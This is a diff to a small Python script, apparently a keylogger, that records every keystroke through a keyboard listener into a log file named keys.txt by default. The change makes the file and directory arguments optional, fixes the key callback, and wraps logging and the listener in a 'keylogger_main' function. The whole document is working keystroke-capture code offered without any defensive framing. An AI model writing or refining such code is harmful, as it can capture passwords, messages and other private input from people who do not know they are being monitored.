@@ -13,12 +13,14 @@ my_parser.add_argument('f',
                         metavar='file',
                         type=str,
                         help='specify the name of the file, by default: keys.txt',
+                        nargs='?',
                         default='keys.txt')
 
 my_parser.add_argument('dir',
                         metavar='dir',
                         type=str,
                         help='specify the name of the directory to save the file in, by default: current directory',
+                        nargs='?',
                         default='')
 
 
@@ -38,15 +40,14 @@ my_parser.add_argument('p',
 
 args = my_parser.parse_args()
 
-
-logging.basicConfig(filename=(args.dir + args.f), \
-    level=logging.DEBUG, format='%(asctime)s: %(message)s')
-
-def on_press(args):
+def on_press(key):
     logging.info(str(key))
     
-with Listener(on_press=on_press) as listener:
-    listener.join()
+def keylogger_main(args):
+    logging.basicConfig(filename=(args.dir + args.f), \
+    level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
-    
+    with Listener(on_press=on_press) as listener:
+        listener.join()
 
+keylogger_main(args)
